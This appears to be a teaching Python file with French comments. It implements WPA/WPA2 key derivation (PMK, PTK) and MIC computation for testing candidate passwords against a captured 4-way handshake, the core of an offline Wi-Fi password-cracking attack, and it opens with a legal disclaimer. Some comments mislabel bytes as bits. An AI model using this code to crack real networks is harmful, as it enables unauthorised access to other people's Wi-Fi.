# -*- coding: utf-8 -*-

# source : https://sadry.net/peace/

#----------DISCLAIMER------------#

# Ces implémentations Python ont été utilisées
# sur un réseau personnel privé, dont les auteurs sont propriétaires.
# Nous rappelons que les écoutes réseaux et tentatives d'attaques sont
# légalement interdites sans l'accord explicite du propriétaire dudit
# réseau. Ce type de comportements constitue un délit (art. 323-1 à 323-7 du code pénal)
# répréhensible de 2 ans d'emprisonnement et de 30 000€ d'amende. Les attaques
# implémentées ont un but pédagogique et scientifique.
# Les auteurs ne pourraient être tenus pour responsables de tout
# comportement illicite au regard de la loi résultant de l'utilisation
# du présent travail dans un contexte non autorisé.

#--------------------------------#


# pour le calcul avec l'algorithme HMAC
import hmac
# pour la conversion des hex en binaire

from hashlib import pbkdf2_hmac, sha1, md5
# pour le calcul de la PMK

# Fonction pseudo aléatoire de calcule de la PTK
# PTK = PRF (PMK + Anonce + Snonce + aa + sa)
# key : la PMK
# A   : b'Pairwise key expansion'
# B   : la concaténation de apMac, staMac, ANonce, SNonce
#       ex: mac1 mac2 nonce1 nonce2
#       de sorte que mac1 &lt; mac2 et nonce1 &lt; nonce2 # =&gt; cette fct renvoie la PTK

def PRF(key, A, B):
    # nombre de bits dans la PTK
    nByte = 64
    i = 0
    R = b''
    # chaque itération produit une valeur de 160 bits, nous en avons besoin de 512
    while (i <= ((nByte * 8 + 159) / 160)):
        hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), sha1)
        R = R + hmacsha1.digest()
        i += 1
    return R[0:nByte]


# création des parametres pour le calcul de la PTK
# aNonce :     celui du 4 way handshake message 1
# sNonce :     celui du 4 way handshake message 2
# apMac  :     la mac du point d'accès
# staMac :     celle de la station
# return :     (A, B)

def MakeAB(aNonce, sNonce, apMac, staMac):
    A = b'Pairwise key expansion'
    B = min(apMac, staMac) + max(apMac, staMac) + min(aNonce, sNonce) + max(aNonce, sNonce)
    return (A, B)


# calcule du premier MIC (message integrity check) contenu dans le message 2
# pwd     :    le mdp a tester
# ssid    :    celui du point d'accès ici ce sera donc 'Harkonen'
# A       :    b'Pairwise key expansion'
# B       :    la concaténation de apMac, staMac, nonce1, nonce2
#              avec mac1 &lt; mac2 et nonce1 &lt; nonce2
# data    :    une liste de trame 802.1x avec le champs MIC à zéro
# return  :    (x, y, z) où x = MIC, y= PTK et z = PMK

def MakeMIC(pwd, ssid, A, B, data, wpa=False):
    # on créer la PMK
    pmk = pbkdf2_hmac('sha1', pwd.encode('ascii'), ssid.encode('ascii'), 4096, 32)
    # pmk avec 4096 itérations de hmac-sha1 qui produise une valeur de 32 bits
    # on créer la PTK
    ptk = PRF(pmk, A, B)
    # l'algorithme de cryptage utilisé pour le WPA est le MD5 , pour le WPA2 c'est du sha1
    hmacFunc = md5 if wpa else sha1
    # enfin on créer les mics en utilisant les données HMAC-SHA-1 et retourne toutes les valeurs calculées
    mics = [hmac.new(ptk[0:16], i, hmacFunc).digest() for i in data]
    return (mics, ptk, pmk)
